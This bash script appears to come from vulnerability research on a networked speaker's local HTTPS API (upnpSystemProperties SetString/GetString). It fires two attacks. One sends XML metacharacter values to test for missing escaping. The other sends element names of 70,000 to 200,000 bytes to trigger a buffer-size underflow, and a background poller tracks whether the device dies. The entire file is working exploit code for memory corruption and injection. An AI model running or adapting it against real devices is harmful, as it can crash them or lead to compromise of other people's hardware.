#!/usr/bin/env bash
# jc7 — fire the two latent weaknesses from findings2 §8, now that argument arrival is proven.
# Oracle (fixed): SetString(VariableName=K, StringValue=V) then GetString(VariableName=K).
# T1: no XML escaping — metacharacter values must come back byte-identical; a broken body
#     changes the rc instead.
# T2: size under-request — 2*len(value)+16 requested while 2*len(name)+len(value)+6 is needed;
#     long names advance the cursor past the 34148 inline buffer and the grow-check underflows.
set -u
IP=${IP:-192.168.4.86}
U=${U:-RINCON_7828CA9221DC01400}
OUT=${OUT:-recon/jc7/weak_fire.tsv}
SPACING=${SPACING:-3}
printf 'ts\tbatch\tcase\tstatus\trc\treadback\n' > "$OUT"

alive() { curl -s -m 4 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION"; }
poll() { while :; do printf '%s %s\n' "$(date -u +%H:%M:%S.%N)" \
    "$(curl -s -m 2 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION")"; sleep 0.1; done; }
: > "$OUT.poll"; poll & POLL=$!

post() { # post <json> -> sets CODE, RC
  printf '%s' "$1" > /tmp/jc7_wf.json
  CODE=$(curl -sk -m 25 -o /tmp/jc7_wf.out -w '%{http_code}' --http1.1 -X POST \
    -H 'X-Sonos-Api-Key: x' -H 'Content-Type: application/json' --data-binary @/tmp/jc7_wf.json \
    "https://$IP:1443/api/v1/players/$U/upnpSystemProperties")
  RC=$(grep -o '"result":[0-9]*' /tmp/jc7_wf.out | cut -d: -f2)
}
getval() { post "{\"method\":\"GetString\",\"input\":[{\"name\":\"VariableName\",\"value\":\"$1\"}]}"
  python3 -c "import json,sys;print(json.load(open('/tmp/jc7_wf.out')).get('parameters',[{}])[0].get('value','') if json.load(open('/tmp/jc7_wf.out')).get('parameters') else '<'+str(json.load(open('/tmp/jc7_wf.out')).get('result'))+'>')" 2>/dev/null || echo '<parse>'; }
setval() { post "{\"method\":\"SetString\",\"input\":[{\"name\":\"VariableName\",\"value\":\"$1\"},{\"name\":\"StringValue\",\"value\":$2}]}"; }

rec() { printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$(date -u +%H:%M:%S)" "$1" "$2" "$CODE" "${RC:--}" "$3" | tee -a "$OUT"; }
batch_end() { local st; st=$(alive)
  printf '%s\t%s\tBATCH_END\t%s\t-\t%s\n' "$(date -u +%H:%M:%S)" "$1" "$st" \
    "$([ "$st" = 200 ] && echo alive || echo DEAD)" | tee -a "$OUT"; }

# ---- T1: XML metacharacters in a bound value, round-tripped -----------------
# A plain control first: the read-back must equal the input, else the oracle is unusable.
n=0
while IFS= read -r v; do
  n=$((n+1)); k="jc7esc$n"
  setval "$k" "$v"; s=$CODE
  rb=$(getval "$k")
  rec T1 "value=$(printf '%s' "$v" | cut -c1-24)" "$s/$rb"
  sleep "$SPACING"
done <<'VALS'
"plain"
"<x>"
"a&b"
"a&b;c"
"\"q\""
"'q'"
"<a/>"
"]]>"
"&#0;"
"<"
"a<b>c&d\"e"
"a\tb"
VALS
batch_end T1

# ---- T2: long element names + 1-byte value, rising arg count ----------------
# Each write requests 18 B but needs ~140 kB; the cursor runs past the inline buffer.
for n in 1 2 3 5 10; do
  python3 - "$n" > /tmp/jc7_wf_body.json <<'PY'
import json,sys
n=int(sys.argv[1])
args=[{"name":("N%05d"%i)+"A"*69995,"value":"x"} for i in range(n)]
print(json.dumps({"method":"SetString","input":args}))
PY
  post "$(cat /tmp/jc7_wf_body.json)"; rec T2 "name70000-value1-x$n" ""
  sleep "$SPACING"
done
# control: short names, same counts
for n in 1 5; do
  python3 - "$n" > /tmp/jc7_wf_body.json <<'PY'
import json,sys
n=int(sys.argv[1])
print(json.dumps({"method":"SetString","input":[{"name":"N%05d"%i,"value":"x"} for i in range(n)]}))
PY
  post "$(cat /tmp/jc7_wf_body.json)"; rec T2 "control-shortname-x$n" ""
  sleep "$SPACING"
done
# 200 kB names, 5 args
python3 - > /tmp/jc7_wf_body.json <<'PY'
import json
print(json.dumps({"method":"SetString","input":[{"name":("N%05d"%i)+"A"*199995,"value":"x"} for i in range(5)]}))
PY
post "$(cat /tmp/jc7_wf_body.json)"; rec T2 "name200000-value1-x5" ""
batch_end T2

# ---- post-batch integrity: a normal round-trip must still work --------------
sleep 2
setval jc7after '"ok"'; s=$CODE; rb=$(getval jc7after)
rec POST "roundtrip" "$s/$rb"
batch_end POST
kill $POLL 2>/dev/null
echo done
